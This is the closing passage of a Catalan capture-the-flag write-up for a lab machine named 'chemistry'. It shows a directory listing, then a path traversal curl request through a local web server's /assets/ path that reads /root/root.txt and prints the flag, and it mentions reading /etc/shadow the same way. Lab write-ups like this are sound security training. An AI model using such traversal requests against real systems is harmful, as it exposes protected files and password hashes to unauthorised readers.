bin   dev  home  lib32  libx32      media  opt   root  sbin  srv  tmp  var

boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  sys  usr

```

Com que el directori /etc està al mateix nivell que el directori root, simplement amb aquesta comanda modificant la part de /etc/shadow per /root/root.txt podem llegir la flag:


```

rosa@chemistry:/$ curl -s --path-as-is http://localhost:8080/assets/../../../../root/root.txt

c09bb70e899db229142e249694c23a4f

```


I ja tenim la màquina resolta i la root flag. El més complicat en aquesta última part ha estat el trobar la forma de fer el Path Traversal correctament a través d'assets, ja que un cop trobat des de l'arrel ja es podien anar trobant la resta de coses.

![[Pasted image 20241107225535.png]]



